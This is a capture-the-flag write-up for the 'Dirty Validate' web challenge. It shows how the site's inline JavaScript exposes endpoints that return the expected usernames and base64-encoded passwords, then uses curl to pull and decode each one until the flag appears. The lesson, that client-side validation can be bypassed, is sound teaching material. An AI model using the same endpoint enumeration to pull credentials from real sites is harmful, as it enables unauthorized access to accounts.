# Dirty Validate
Web

## Challenge 

To keep my server from doing a lot of work, I made javascript do the heavy lifting of checking a user's password

https://challenges.neverlanctf.com:1135

## Solution

We see the inline javascript validator function

	// make an ajax request to get the expected username
    $.ajax('webhooks/get_username.php',{})

Likewise, for the password 
		
	// make an ajax request to get the expected password for the given username
    $.ajax('webhooks/get_password.php?user='+encodeURIComponent($('#name').val()),{})

So retrieving it all...

	$ curl https://challenges.neverlanctf.com:1135/webhooks/get_username.php
	{"usernames": ["AdamsFamily","Mr. Clean","Dr. Whom","JimmyOneShoe"]}
	
	$ curl https://challenges.neverlanctf.com:1135/webhooks/get_password.php?user=AdamsFamily
	VHJ5IGEgZGlmZmVyZW50IHVzZXI=

	$ curl -s https://challenges.neverlanctf.com:1135/webhooks/get_password.php?user=Mr.%20Clean
	  | base64 -D
	not this one either...

	$ curl -s https://challenges.neverlanctf.com:1135/webhooks/get_password.php?user=AdamsFamily
	  | base64 -D
	Try a different user

	$ curl -s https://challenges.neverlanctf.com:1135/webhooks/get_password.php?user=JimmyOneShoe
	  | base64 -D
	Wrong user
	$ curl -s https://challenges.neverlanctf.com:1135/webhooks/get_password.php?user=Dr.%20Whom
	  | base64 -D
	flag{D0n't_7rus7_JS}

## Flag

	flag{D0n't_7rus7_JS}
